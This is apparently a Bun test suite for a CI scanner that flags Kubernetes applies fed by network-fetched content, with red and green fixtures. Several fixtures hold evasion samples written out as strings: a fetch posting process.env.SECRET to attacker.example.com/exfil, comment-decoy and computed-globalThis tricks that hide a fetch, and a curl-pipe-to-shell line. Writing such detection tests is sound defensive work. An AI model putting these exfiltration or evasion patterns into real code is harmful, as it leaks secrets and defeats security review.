import { describe, expect, it } from 'bun:test';
import {
  hasComputedGlobalAccess,
  INTERPRETER_FETCH,
  unsafeApplies,
  unsafeAppliesInWorkflow,
} from '../scripts/lib/apply-safety-scan.mjs';

/**
 * Tech-debt closures (#1466, #1512): the apply-safety scanner
 * (`scripts/lib/apply-safety-scan.mjs`) did not yet track three ways
 * fetched bytes reach a cluster apply (heredoc-to-file-to-apply, an
 * `envsubst` pipeline, `kubectl patch -p`/`--patch`), and did not follow a
 * `node <file>.mjs` / `bun <file>.mjs` invocation to classify fetches moved
 * out of shell text. `eval` was already handled (round-4 `execString`); a
 * regression fixture proves it here rather than re-implementing it.
 *
 * Each construct gets a RED fixture (the bypass) and a GREEN fixture (the
 * legitimate shape used in the real tree) — never a generic exemption, per
 * `.claude/rules/workflow.md` ("prefer scanning to enumerating ... make an
 * unparseable construct FAIL rather than pass").
 */

const FETCH = 'X=$(curl -s https://example.com/x)';

describe('apply-safety-scan: heredoc -> file -> apply (#1466.1)', () => {
  it('reds a fetched value interpolated into a heredoc written to a file that is later applied', () => {
    const src = `${FETCH}\ncat > m.yaml <<YAML\napiVersion: v1\ndata: $X\nYAML\nkubectl apply -f m.yaml\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('stays green for a heredoc written to a file with no network content', () => {
    const src = 'cat > m.yaml <<YAML\napiVersion: v1\ndata: local\nYAML\nkubectl apply -f m.yaml\n';
    expect(unsafeApplies(src)).toEqual([]);
  });

  it('reds a QUOTED heredoc delimiter too (a fetched value can still land via a prior taint chain)', () => {
    // The heredoc body itself is literal ($X does not expand inside a quoted
    // delimiter), but the file was already network-tainted by an earlier
    // fetch write — the write-loop must not silently clear that taint.
    const src = `curl -s https://example.com/x -o m.yaml\ncat >> m.yaml <<'YAML'\nfooter\nYAML\nkubectl apply -f m.yaml\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });
});

describe('apply-safety-scan: envsubst pipeline (#1466.2)', () => {
  it('reds envsubst piped into an apply when an exported var holds network content', () => {
    const src = `export ${FETCH.replace('X=', 'X=')}\nenvsubst < tpl.yaml | kubectl apply -f -\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('stays green for envsubst piped into an apply with only local exported vars', () => {
    const src = 'export LOCAL=hello\nenvsubst < tpl.yaml | kubectl apply -f -\n';
    expect(unsafeApplies(src)).toEqual([]);
  });
});

describe('apply-safety-scan: kubectl patch -p / --patch / --patch-file (#1466.3)', () => {
  it('reds a patch body built from a fetched value (-p)', () => {
    const src = `${FETCH}\nkubectl patch deployment foo -p "$X"\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('reds a patch body built from a fetched value (--patch)', () => {
    const src = `${FETCH}\nkubectl patch deployment foo --patch "$X"\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('reds a --patch-file naming a network-tainted file', () => {
    const src = `curl -s https://example.com/x -o patch.json\nkubectl patch deployment foo --patch-file patch.json\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('stays green for a literal patch body', () => {
    const src = `kubectl patch deployment foo -p '{"spec":{"replicas":1}}'\n`;
    expect(unsafeApplies(src)).toEqual([]);
  });

  it('stays green for kubectl set env with only literal values (not a fetched value)', () => {
    const src = 'kubectl set env deployment/foo FOO=bar\n';
    expect(unsafeApplies(src)).toEqual([]);
  });

  it('reds kubectl set env with a fetched value', () => {
    const src = `${FETCH}\nkubectl set env deployment/foo "FOO=$X"\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });
});

describe('apply-safety-scan: eval regression (already handled, round-4 execString)', () => {
  it('still reds eval of a string built from a fetched value', () => {
    const src = `${FETCH}\neval "kubectl apply -f \\$X"\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });
});

describe('apply-safety-scan: node/bun <file>.mjs fetch following (#1512)', () => {
  const LOOPBACK_JS = `import http from 'node:http';\nhttp.get({ host: '127.0.0.1', port: 1, path: '/', timeout: 1 }, () => {});\n`;
  const REMOTE_JS = `import http from 'node:http';\nhttp.get({ host: '10.255.255.1', port: 1, path: '/', timeout: 1 }, () => {});\n`;
  const REMOTE_URL_JS = `fetch('https://example.com/x');\n`;
  const DYNAMIC_HOST_JS = `import http from 'node:http';\nhttp.get({ host: process.env.TARGET, port: 1 }, () => {});\n`;
  const NO_FETCH_JS = `console.log('nothing to see here');\n`;

  // #1715: these fixtures all apply a manifest after the followed-script
  // call, so `hasApplyAnywhere` is true and the followed-script rule stays
  // live — see the dedicated `hasApplyAnywhere gate (#1715)` describe block
  // below for the gate's own red/green pair.
  const APPLY_AFTER = '\nkubectl apply -f m.yaml\n';

  it('reds a node <file>.mjs invocation whose script fetches a non-loopback literal host', () => {
    const src = `node scripts/lib/probe.mjs 8080 /x 2xx3xx\n${APPLY_AFTER}`;
    const offenders = unsafeApplies(src, { resolveSource: () => REMOTE_JS, followScripts: true });
    expect(offenders.length).toBeGreaterThan(0);
  });

  it('reds a bun <file>.mjs invocation whose script fetches a bare non-loopback URL literal', () => {
    const src = `bun scripts/lib/probe.mjs\n${APPLY_AFTER}`;
    const offenders = unsafeApplies(src, {
      resolveSource: () => REMOTE_URL_JS,
      followScripts: true,
    });
    expect(offenders.length).toBeGreaterThan(0);
  });

  it('fails closed on a dynamic (non-literal) fetch host', () => {
    const src = `node scripts/lib/probe.mjs\n${APPLY_AFTER}`;
    const offenders = unsafeApplies(src, {
      resolveSource: () => DYNAMIC_HOST_JS,
      followScripts: true,
    });
    expect(offenders.length).toBeGreaterThan(0);
  });

  it('fails closed when the invoked script cannot be resolved', () => {
    const src = `node scripts/lib/probe.mjs\n${APPLY_AFTER}`;
    const offenders = unsafeApplies(src, { resolveSource: () => null, followScripts: true });
    expect(offenders.length).toBeGreaterThan(0);
  });

  it('stays green for a node <file>.mjs script that fetches only a loopback literal host (the real e2e-probe-http.mjs shape)', () => {
    const src = `node scripts/lib/probe.mjs 8080 /x 2xx3xx\n${APPLY_AFTER}`;
    expect(unsafeApplies(src, { resolveSource: () => LOOPBACK_JS, followScripts: true })).toEqual(
      [],
    );
  });

  it('stays green for a node <file>.mjs invocation with .js/.cjs targets too (#1715 widening)', () => {
    const cjsSrc = `node scripts/lib/probe.cjs\n${APPLY_AFTER}`;
    expect(
      unsafeApplies(cjsSrc, { resolveSource: () => LOOPBACK_JS, followScripts: true }),
    ).toEqual([]);
    const jsOffenders = unsafeApplies(`node scripts/lib/probe.js\n${APPLY_AFTER}`, {
      resolveSource: () => REMOTE_JS,
      followScripts: true,
    });
    expect(jsOffenders.length).toBeGreaterThan(0);
  });

  it('stays green for a node <file>.mjs script with no fetch shape at all', () => {
    const src = 'node scripts/lib/probe.mjs\n';
    expect(unsafeApplies(src, { resolveSource: () => NO_FETCH_JS, followScripts: true })).toEqual(
      [],
    );
  });

  it('does not flag any node/bun invocation when no resolveSource is passed at all (opt-in, no new noise on existing callers)', () => {
    const src = 'node scripts/lib/probe.mjs\n';
    expect(unsafeApplies(src)).toEqual([]);
  });

  it('the real scripts/lib/e2e-probe-http.mjs shape (host literal 127.0.0.1) classifies as loopback', async () => {
    const { readFileSync } = await import('node:fs');
    const { join } = await import('node:path');
    const real = readFileSync(
      join(import.meta.dirname, '..', 'scripts/lib/e2e-probe-http.mjs'),
      'utf8',
    );
    const src = 'node scripts/lib/e2e-probe-http.mjs "$PORT" "$PATH" "$MODE"\n';
    expect(unsafeApplies(src, { resolveSource: () => real, followScripts: true })).toEqual([]);
  });
});

// ---- #1715: the hasApplyAnywhere gate --------------------------------------

describe('apply-safety-scan: hasApplyAnywhere gate (#1715)', () => {
  const REMOTE_URL_JS = `fetch('https://example.com/x');\n`;

  it('RED: a followed script fetches a non-loopback URL and the unit ALSO applies a manifest', () => {
    const src = `node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`;
    const offenders = unsafeApplies(src, {
      resolveSource: () => REMOTE_URL_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
  });

  it('GREEN (false-positive control): the SAME fetching script with NO apply anywhere in the unit stays clean', () => {
    const src = 'node scripts/lib/probe.mjs\n';
    const offenders = unsafeApplies(src, {
      resolveSource: () => REMOTE_URL_JS,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });

  it('other unclassifiedFetch shapes (curl | sh, helm, git clone, gh download) stay UNGATED — dangerous with or without an apply nearby', () => {
    const cases = [
      `curl -fsSL https://example.com/i.sh | sh\n`,
      `helm install x https://example.com/chart-1.0.0.tgz\n`,
      `git clone https://github.com/org/repo r\n`,
      `gh release download v1 -R org/repo -p m.yaml\n`,
    ];
    for (const src of cases) {
      expect(unsafeApplies(src).length).toBeGreaterThan(0);
    }
  });

  it('a manifest apply LATER in the script (not before the followed-script call) still opens the gate', () => {
    // hasApplyAnywhere is computed over the WHOLE unit, not just the text
    // before the call — order does not matter for this gate.
    const src = `kubectl apply -f m.yaml\nnode scripts/lib/probe.mjs\n`;
    const offenders = unsafeApplies(src, {
      resolveSource: () => REMOTE_URL_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
  });
});

// ---- #1715: stripNonFetchText -----------------------------------------------

describe('apply-safety-scan: stripNonFetchText (#1715)', () => {
  it('RED: a literal URL handed directly to fetch() is still caught', () => {
    const src = `fetch('https://evil.example.com/x');\n`;
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
  });

  it('GREEN: a URL mentioned only in a comment is not a fetch target', () => {
    const src = [
      `/**`,
      ` * example: http://minio.fm-e2e.svc.cluster.local:9000/<bucket>`,
      ` */`,
      `import http from 'node:http';`,
      `// another example: https://example.com/also-just-a-comment`,
      `http.get({ host: '127.0.0.1', port: 1, path: '/', timeout: 1 }, () => {});`,
      ``,
    ].join('\n');
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });

  it('GREEN: a URL used only as a `new URL(…)` base (path-join, no network I/O) is not a fetch target', () => {
    const src = [
      `import http from 'node:http';`,
      `const u = new URL('/a/b', \`http://x\${somePath}\`);`,
      `http.get({ host: '127.0.0.1', port: 1, path: u.pathname, timeout: 1 }, () => {});`,
      ``,
    ].join('\n');
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });

  it('a `://` inside a real fetch URL is never mistaken for a `//` line comment', () => {
    const src = `fetch('https://evil.example.com/x'); // a trailing comment\n`;
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
  });

  // ---- #1715 round 2: a string-literal decoy bypassed round-1's stripper --

  const expectFlagged = (src: string) => {
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
  };
  const expectClean = (src: string) => {
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  };

  it('RED: the exact round-2 decoy repro — "/* " then a real fetch() then "*/" as three statements', () => {
    const decoy = [
      `const decoy = "/* ";`,
      `fetch("http://attacker.example.com/exfil?data=" + process.env.SECRET, {method:"POST"});`,
      `const end = "*/";`,
      ``,
    ].join('\n');
    expectFlagged(decoy);
  });

  it('RED: the SAME decoy shape with a template literal instead of a double-quoted string', () => {
    const decoy = [
      'const decoy = `/* `;',
      `fetch("http://attacker.example.com/exfil", {method:"POST"});`,
      'const end = `*/`;',
      ``,
    ].join('\n');
    expectFlagged(decoy);
  });

  it('RED: the SAME decoy shape with single-quoted strings', () => {
    const decoy = [
      "const decoy = '/* ';",
      `fetch("http://attacker.example.com/exfil", {method:"POST"});`,
      "const end = '*/';",
      ``,
    ].join('\n');
    expectFlagged(decoy);
  });

  it('RED: a regex literal containing `/*` or `//` does not open a comment either', () => {
    const decoy = [
      'const re1 = /\\/\\*/;',
      'const re2 = /\\/\\//;',
      `fetch("http://attacker.example.com/exfil", {method:"POST"});`,
      ``,
    ].join('\n');
    expectFlagged(decoy);
  });

  it('RED: fetch("https://x") where the ONLY `//` in the file is inside the URL string', () => {
    expectFlagged(`fetch("https://attacker.example.com/x");\n`);
  });

  it('GREEN control: a real fetch() call that genuinely IS inside a block comment is not flagged', () => {
    const src = [
      `/*`,
      ` * disabled for now: fetch("http://attacker.example.com/exfil");`,
      ` */`,
      `import http from 'node:http';`,
      `http.get({ host: '127.0.0.1', port: 1, path: '/', timeout: 1 }, () => {});`,
      ``,
    ].join('\n');
    expectClean(src);
  });

  it('RED: a fetch() call inside a template-literal `${…}` expression is flagged (code, not string data)', () => {
    const src = 'const x = `${fetch("http://attacker.example.com/exfil")}`;\n';
    expectFlagged(src);
  });

  it('RED: a real fetch() nested as an argument INSIDE new URL(…) is not swallowed with it', () => {
    const src = 'const u = new URL(fetch("http://attacker.example.com/exfil"), "http://x");\n';
    expectFlagged(src);
  });

  it('RED: an unterminated template literal fails closed even with no visible fetch shape', () => {
    // #1715 round 2, guarantee (2): the tokenizer itself could not fully
    // parse this file (the backtick never closes) — flag regardless of
    // whether INTERPRETER_FETCH matches anything.
    const src = 'import http from "node:http";\nconst s = `unterminated\n';
    expectFlagged(src);
  });
});

// ---- #1787: aliased / computed fetch ---------------------------------------

describe('apply-safety-scan: aliased/computed fetch (#1787)', () => {
  const APPLY_AFTER = '\nkubectl apply -f m.yaml\n';

  it('RED: a followed script aliases fetch to a local binding before calling it', () => {
    const js = `const f = fetch;\nf('https://example.com/x');\n`;
    const src = `node scripts/lib/probe.mjs\n${APPLY_AFTER}`;
    const offenders = unsafeApplies(src, { resolveSource: () => js, followScripts: true });
    expect(offenders.length).toBeGreaterThan(0);
  });

  it('RED: a followed script reaches fetch through a computed globalThis[...] member access', () => {
    const js = `globalThis["fe" + "tch"]('https://example.com/x');\n`;
    const src = `node scripts/lib/probe.mjs\n${APPLY_AFTER}`;
    const offenders = unsafeApplies(src, { resolveSource: () => js, followScripts: true });
    expect(offenders.length).toBeGreaterThan(0);
  });

  it('RED: an inline `node -e` alias in shell text is caught without any followed script at all', () => {
    // No `resolveSource`/`followScripts` needed — `isFetchSegment` scans the
    // interpreter's OWN inline argument text.
    const src = `node -e "const f = fetch; f('https://example.com/x').then(()=>{})"\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('RED: an inline `node -e` computed globalThis access is caught the same way', () => {
    const src = `node -e "globalThis['fe'+'tch']('https://example.com/x')"\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('GREEN: a CLI flag literally spelled --fetch does not false-positive', () => {
    // #1787 round 2 regression guard: the real tree invokes followed scripts
    // with a `--fetch` flag (`compat-window-audit.mjs --fetch --matrix`) —
    // the aliasing fix must not treat that hyphenated flag text as a fetch
    // reference.
    const src = 'node scripts/compat-window-audit.mjs --fetch --matrix --json\n';
    expect(unsafeApplies(src)).toEqual([]);
  });

  it('GREEN: a kebab-case identifier containing "fetch" (not the API) does not false-positive', () => {
    const src = 'node test/bun-sandbox-fetch-ab/run-trials.mjs --runtime node\n';
    expect(unsafeApplies(src)).toEqual([]);
  });

  it('GREEN: globalThis[...] with a plain string literal key is not "computed" — the literal key still contains the word fetch and is caught by the ordinary bare-word match, not by a false "computed" positive on an UNRELATED literal key', () => {
    const js = `globalThis['someOtherFunction']('https://loopback-not-used');\n`;
    // No `fetch` text anywhere and the key is a plain literal — neither rule fires.
    expect(hasComputedGlobalAccess(js)).toBe(false);
  });

  it('GREEN: a global member access with a literal numeric key is not computed', () => {
    const js = `const x = window[0];\n`;
    expect(hasComputedGlobalAccess(js)).toBe(false);
  });

  it('RED (unit): hasComputedGlobalAccess flags a variable key', () => {
    expect(hasComputedGlobalAccess('globalThis[name]("https://x")')).toBe(true);
  });

  it('RED (unit): hasComputedGlobalAccess flags string concatenation', () => {
    expect(hasComputedGlobalAccess('globalThis["fe" + "tch"]')).toBe(true);
  });
});

// ---- #1780: hasApplyAnywhere gate widening ---------------------------------

describe('apply-safety-scan: hasApplyAnywhere sees a dependent job via needs:+artifact/outputs (#1780)', () => {
  const FETCH_JS = `fetch('https://example.com/x');\n`;

  it('RED: job A fetches (no apply of its own), job B `needs:` A, consumes its output, and applies', () => {
    const doc = {
      jobs: {
        fetchJob: {
          outputs: { manifestUrl: '${{ steps.f.outputs.url }}' },
          steps: [{ id: 'f', run: 'node scripts/lib/probe.mjs\n' }],
        },
        applyJob: {
          needs: 'fetchJob',
          steps: [
            {
              run: 'kubectl apply -f "${{ needs.fetchJob.outputs.manifestUrl }}"\n',
            },
          ],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => FETCH_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('fetchJob'))).toBe(true);
  });

  it('RED: the same shape linked by an artifact hand-off instead of outputs', () => {
    const doc = {
      jobs: {
        fetchJob: {
          steps: [
            { run: 'node scripts/lib/probe.mjs\n' },
            { uses: 'actions/upload-artifact@v4', with: { name: 'm', path: 'm.yaml' } },
          ],
        },
        applyJob: {
          needs: 'fetchJob',
          steps: [
            { uses: 'actions/download-artifact@v4', with: { name: 'm' } },
            { run: 'kubectl apply -f m.yaml\n' },
          ],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => FETCH_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('fetchJob'))).toBe(true);
  });

  it('GREEN (false-positive control): a bare `needs:` edge with NO artifact/outputs evidence stays job-scoped', () => {
    // Most `needs:` edges in the real tree are pure sequencing (a
    // "red-alert" job that only needs its predecessor to decide whether to
    // fire) — widening on `needs:` alone would flag nearly every multi-job
    // workflow and defeat the point of the gate.
    const doc = {
      jobs: {
        fetchJob: { steps: [{ run: 'node scripts/lib/probe.mjs\n' }] },
        unrelatedApplyJob: {
          needs: 'fetchJob',
          steps: [{ run: 'kubectl apply -f m.yaml\n' }],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => FETCH_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('fetchJob'))).toBe(false);
  });

  it('GREEN (false-positive control): needs:+artifact with NEITHER job applying anything stays clean', () => {
    const doc = {
      jobs: {
        fetchJob: {
          steps: [
            { run: 'node scripts/lib/probe.mjs\n' },
            { uses: 'actions/upload-artifact@v4', with: { name: 'm', path: 'm.yaml' } },
          ],
        },
        consumerJob: {
          needs: 'fetchJob',
          steps: [
            { uses: 'actions/download-artifact@v4', with: { name: 'm' } },
            { run: 'cat m.yaml\n' },
          ],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => FETCH_JS,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });
});

describe('apply-safety-scan: hasApplyAnywhere sees an apply inside a called uses: (#1780)', () => {
  const FETCH_JS = `fetch('https://example.com/x');\n`;

  // Each case below pairs the `uses:`-only shape with a FETCHING sibling,
  // linked by `needs:`+artifact — the apply hidden in the called unit is
  // otherwise invisible, so only by widening `hasApplyAnywhere` across the
  // linked component does the sibling's followed-script fetch get flagged.
  // This proves the called unit's apply was actually SEEN, not just that
  // nothing crashed.
  const linkedDoc = (callerJob: Record<string, unknown>) => ({
    jobs: {
      fetchJob: {
        steps: [
          { run: 'node scripts/lib/probe.mjs\n' },
          { uses: 'actions/upload-artifact@v4', with: { name: 'm', path: 'm.yaml' } },
        ],
      },
      callerJob: { needs: 'fetchJob', ...callerJob },
    },
  });

  it('RED: a job that ONLY `uses:` a LOCAL composite action, which itself applies, opens the gate for its linked component', () => {
    // The job has no `run:` steps of its OWN, so the apply is invisible to
    // `textHasManifestApply` unless the called action is read.
    const doc = linkedDoc({ steps: [{ uses: './.github/actions/apply-thing' }] });
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: (p) =>
        p === './.github/actions/apply-thing/action.yml'
          ? 'runs:\n  steps:\n    - run: kubectl apply -f m.yaml\n'
          : FETCH_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('fetchJob'))).toBe(true);
  });

  it('RED: a job-level LOCAL reusable-workflow call that applies feeds a fetching sibling in its needs:-linked component', () => {
    const doc = linkedDoc({ uses: './.github/workflows/applies.yml' });
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: (p) =>
        p === './.github/workflows/applies.yml'
          ? 'jobs:\n  x:\n    steps:\n      - run: kubectl apply -f m.yaml\n'
          : FETCH_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('fetchJob'))).toBe(true);
  });

  it('RED: a job-level REMOTE reusable-workflow call fails closed as "might apply", opening the gate for its linked component', () => {
    const doc = linkedDoc({ uses: 'org/repo/.github/workflows/x.yml@v1' });
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => FETCH_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('fetchJob'))).toBe(true);
  });

  it('GREEN (false-positive control): a job that `uses:` a well-known non-applying remote action ALONGSIDE its own run: steps is unaffected', () => {
    const doc = {
      jobs: {
        normalJob: {
          steps: [{ uses: 'actions/checkout@v4' }, { run: 'node scripts/lib/probe.mjs\n' }],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => FETCH_JS,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });

  it('GREEN (false-positive control): a uses:-only job calling a KNOWN non-applying remote action stays clean', () => {
    const doc = {
      jobs: {
        scanJob: { steps: [{ uses: 'aquasecurity/trivy-action@v1' }] },
      },
    };
    expect(unsafeAppliesInWorkflow(doc)).toEqual([]);
  });

  it('GREEN (false-positive control): a KNOWN non-applying remote action linked to a fetching sibling stays clean', () => {
    // A uses:-only job with no `run:` steps of its own never flags anything
    // by itself (there's no step text to scan) — the exemption only has an
    // observable effect once it feeds a linked, fetching sibling's gate.
    const doc = linkedDoc({ steps: [{ uses: 'aquasecurity/trivy-action@v1' }] });
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => FETCH_JS,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });

  it('GREEN (false-positive control): a uses:-only job calling a NON-APPLYING local composite action stays clean', () => {
    const doc = {
      jobs: {
        callerJob: { steps: [{ uses: './.github/actions/noop-thing' }] },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: (p) =>
        p === './.github/actions/noop-thing/action.yml'
          ? 'runs:\n  steps:\n    - run: echo hi\n'
          : null,
    });
    expect(offenders).toEqual([]);
  });

  it('GREEN (false-positive control): a NON-applying uses:-only job linked to a fetching sibling stays clean', () => {
    const doc = linkedDoc({ steps: [{ uses: './.github/actions/noop-thing' }] });
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: (p) =>
        p === './.github/actions/noop-thing/action.yml'
          ? 'runs:\n  steps:\n    - run: echo hi\n'
          : FETCH_JS,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });
});

// ---- #1801 round 3: 5 code-review findings, each RED + GREEN ---------------

describe('apply-safety-scan: fix 1 — a job with run: AND uses: steps is checked on BOTH (#1801 round 3)', () => {
  const FETCH_JS = `fetch('https://example.com/x');\n`;

  it('RED: run: fetches, a LOCAL uses: step in the SAME job applies — previously invisible because the job also had run: steps', () => {
    const doc = {
      jobs: {
        mixedJob: {
          steps: [{ run: 'node scripts/lib/probe.mjs\n' }, { uses: './.github/actions/apply' }],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: (p) =>
        p === './.github/actions/apply/action.yml'
          ? 'runs:\n  steps:\n    - run: kubectl apply -f m.yaml\n'
          : FETCH_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('mixedJob'))).toBe(true);
  });

  it('RED: run: fetches, a REMOTE non-allowlisted uses: step (azure/k8s-deploy) in the SAME job — not gated open by run: steps existing', () => {
    const doc = {
      jobs: {
        mixedJob: {
          steps: [{ run: 'node scripts/lib/probe.mjs\n' }, { uses: 'azure/k8s-deploy@v4' }],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => FETCH_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('mixedJob'))).toBe(true);
  });

  it('GREEN (false-positive control): run: + a KNOWN non-applying uses: step (actions/checkout) in the same job stays clean', () => {
    const doc = {
      jobs: {
        normalJob: {
          steps: [{ uses: 'actions/checkout@v4' }, { run: 'echo hi\n' }],
        },
      },
    };
    expect(unsafeAppliesInWorkflow(doc)).toEqual([]);
  });
});

describe('apply-safety-scan: fix 2 — docker:// steps fail closed (#1801 round 3)', () => {
  const FETCH_JS = `fetch('https://example.com/x');\n`;

  it('RED: docker://bitnami/kubectl with apply args in the SAME job as a fetch', () => {
    const doc = {
      jobs: {
        dockerJob: {
          steps: [
            { run: 'node scripts/lib/probe.mjs\n' },
            { uses: 'docker://bitnami/kubectl', with: { args: 'apply -f m.yaml' } },
          ],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => FETCH_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('dockerJob'))).toBe(true);
  });

  it('RED: a docker:// step with NO args still fails closed (unknown image, no carve-out exists)', () => {
    const doc = {
      jobs: {
        dockerJob: {
          steps: [{ run: 'node scripts/lib/probe.mjs\n' }, { uses: 'docker://alpine' }],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => FETCH_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('dockerJob'))).toBe(true);
  });

  it('GREEN (false-positive control): a docker:// step with NO fetch anywhere in the unit stays clean on its own', () => {
    const doc = {
      jobs: {
        dockerJob: { steps: [{ uses: 'docker://alpine', with: { args: 'echo hi' } }] },
      },
    };
    expect(unsafeAppliesInWorkflow(doc)).toEqual([]);
  });
});

describe('apply-safety-scan: fix 3 — local composite actions followed recursively (#1801 round 3)', () => {
  const FETCH_JS = `fetch('https://example.com/x');\n`;

  it('RED: a local composite wraps a REMOTE deploy action — one hop of recursion', () => {
    const doc = {
      jobs: {
        callerJob: {
          steps: [{ run: 'node scripts/lib/probe.mjs\n' }, { uses: './.github/actions/wrapper' }],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: (p) => {
        if (p === './.github/actions/wrapper/action.yml')
          return 'runs:\n  steps:\n    - uses: azure/k8s-deploy@v4\n';
        return FETCH_JS;
      },
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('callerJob'))).toBe(true);
  });

  it('RED: a local composite wraps ANOTHER local composite that applies — two hops of recursion', () => {
    const doc = {
      jobs: {
        callerJob: {
          steps: [{ run: 'node scripts/lib/probe.mjs\n' }, { uses: './.github/actions/outer' }],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: (p) => {
        if (p === './.github/actions/outer/action.yml')
          return 'runs:\n  steps:\n    - uses: ./.github/actions/inner\n';
        if (p === './.github/actions/inner/action.yml')
          return 'runs:\n  steps:\n    - run: kubectl apply -f m.yaml\n';
        return FETCH_JS;
      },
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('callerJob'))).toBe(true);
  });

  it('RED: an UNRESOLVABLE local uses: path fails closed', () => {
    const doc = {
      jobs: {
        callerJob: {
          steps: [{ run: 'node scripts/lib/probe.mjs\n' }, { uses: './.github/actions/missing' }],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: (p) => (p.startsWith('./.github/actions/missing/action.') ? null : FETCH_JS),
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('callerJob'))).toBe(true);
  });

  it('GREEN (false-positive control): a two-composite CYCLE with no apply anywhere terminates and stays clean (visited-set proof)', () => {
    const doc = {
      jobs: {
        callerJob: {
          steps: [{ run: 'node scripts/lib/probe.mjs\n' }, { uses: './.github/actions/cycle-a' }],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: (p) => {
        if (p === './.github/actions/cycle-a/action.yml')
          return 'runs:\n  steps:\n    - uses: ./.github/actions/cycle-b\n';
        if (p === './.github/actions/cycle-b/action.yml')
          return 'runs:\n  steps:\n    - uses: ./.github/actions/cycle-a\n';
        return FETCH_JS;
      },
      followScripts: true,
    });
    // If the visited set did not stop the cycle, this call would recurse
    // forever and the test itself would time out rather than report any
    // particular array — reaching this assertion at all is part of the proof.
    expect(offenders).toEqual([]);
  });

  it('GREEN (false-positive control): a local composite wrapping a KNOWN non-applying remote action stays clean', () => {
    const doc = {
      jobs: {
        callerJob: {
          steps: [{ run: 'node scripts/lib/probe.mjs\n' }, { uses: './.github/actions/wrapper' }],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: (p) => {
        if (p === './.github/actions/wrapper/action.yml')
          return 'runs:\n  steps:\n    - uses: actions/checkout@v4\n';
        return FETCH_JS;
      },
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });
});

